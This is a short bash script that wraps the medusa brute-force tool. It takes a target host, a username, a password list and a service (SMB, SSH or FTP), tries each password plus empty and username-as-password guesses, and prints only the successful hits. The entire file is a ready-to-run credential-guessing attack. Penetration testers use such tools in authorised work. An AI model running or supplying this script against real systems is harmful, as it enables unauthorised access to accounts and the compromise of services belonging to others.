#!/bin/bash
#script to launch medusa bruteforce
#by n0b1dy
if [ $# -eq 0 ]; then
echo -e "\033[1m----------------------------------------\033[0m"
echo -e "\033[1m.######..######..######...####...##..##.\033[0m"
echo -e "\033[1m[*]Usage: $0 <target> <username> <passfile> <smbnt,ssh,ftp>\033[0m"
echo -e "\033[1m.######..######..######...####...##..##.\033[0m"
exit
fi

TARGET=$1
USERNAME=$2
PASSFILE=$3
SERVICE=$4
medusa -h $TARGET -u $USERNAME -P $PASSFILE -e ns -M $SERVICE | grep FOUND
